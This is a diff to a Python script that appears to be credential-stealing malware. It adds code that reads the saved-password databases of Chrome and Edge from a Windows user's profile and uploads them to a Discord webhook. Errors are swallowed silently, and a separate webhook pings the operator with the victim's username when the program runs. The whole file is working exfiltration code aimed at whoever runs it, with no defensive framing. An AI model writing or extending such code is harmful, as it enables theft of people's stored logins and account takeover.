@@ -1,4 +1,4 @@
-for i in range(2)
+for i in range(2):
     try:
         import subprocess
         from time import sleep
@@ -38,10 +38,21 @@ def spiderman():
 
     stats = 0
     cppath = path2 + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-    chook = DiscordWebhook(url=passhook)
-    with open(cppath,"rb") as f:
-        chook.add_file(file=f.read(),filename='Login Data')
-    chook.execute(remove_files=True)
+    try:
+        chook = DiscordWebhook(url=passhook)
+        with open(cppath,"rb") as f:
+            chook.add_file(file=f.read(),filename='CLogin Data')
+        chook.execute(remove_files=True)
+    except:
+        nopp = True
+    try:
+        eppath = path2 + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
+        ehook = DiscordWebhook(url=passhook)
+        with open(eppath, "rb") as f:
+            ehook.add_file(file=f.read(), filename='ELogin Data')
+        ehook.execute(remove_files=True)
+    except:
+        nopp = True
 
     thehook = pichook
     pingus = DiscordWebhook(url=pinghook, content=f'Hello, <@820217436552167484>! {getpass.getuser()} started the program!')
